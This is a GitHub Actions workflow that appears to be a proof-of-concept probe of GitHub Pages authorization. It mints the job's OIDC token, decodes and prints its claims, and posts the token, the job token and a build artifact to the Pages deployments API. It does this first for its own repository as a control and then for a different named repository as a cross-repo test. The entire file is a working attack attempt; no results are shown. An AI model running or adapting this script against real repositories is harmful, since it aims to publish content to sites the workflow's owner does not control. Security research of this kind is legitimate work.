name: xrepo
on: [push, workflow_dispatch]
permissions:
  contents: read
  pages: write
  id-token: write
  actions: read
jobs:
  t:
    runs-on: ubuntu-latest
    steps:
      - run: mkdir -p _site && echo "<h1>ARTIFACT-FROM-REPO-A</h1>" > _site/index.html
      - uses: actions/upload-pages-artifact@v3
        with:
          path: _site
      - name: fire
        env:
          GHT: ${{ github.token }}
          REPO: ${{ github.repository }}
          RUNID: ${{ github.run_id }}
          SHA: ${{ github.sha }}
        run: |
          set +e
          ART=$(curl -s -H "Authorization: Bearer $GHT" \
            "https://api.github.com/repos/$REPO/actions/runs/$RUNID/artifacts" \
            | python3 -c "import sys,json;a=json.load(sys.stdin)['artifacts'];print(a[0]['id'] if a else '')")
          echo "ARTIFACT_ID=$ART"
          TOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL" \
            | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])")
          echo "$TOK" | cut -d. -f2 > /tmp/c.b64
          python3 -c "
import base64,json
s=open('/tmp/c.b64').read().strip(); s+='='*(-len(s)%4)
d=json.loads(base64.urlsafe_b64decode(s))
print('CLAIM repository:',d.get('repository'))
print('CLAIM aud:',d.get('aud'))
print('CLAIM sub:',d.get('sub'))"
          BODY="{\"artifact_id\":$ART,\"pages_build_version\":\"$SHA\",\"oidc_token\":\"$TOK\"}"
          echo "=== CONTROL same-repo ==="
          curl -s -w "\nHTTP:%{http_code}\n" -X POST -H "Authorization: Bearer $GHT" \
            -H "Accept: application/vnd.github+json" -d "$BODY" \
            "https://api.github.com/repos/$REPO/pages/deployments"
          echo "=== TEST cross-repo ==="
          curl -s -w "\nHTTP:%{http_code}\n" -X POST -H "Authorization: Bearer $GHT" \
            -H "Accept: application/vnd.github+json" -d "$BODY" \
            "https://api.github.com/repos/mr-benty/rationale-sink-0802/pages/deployments"
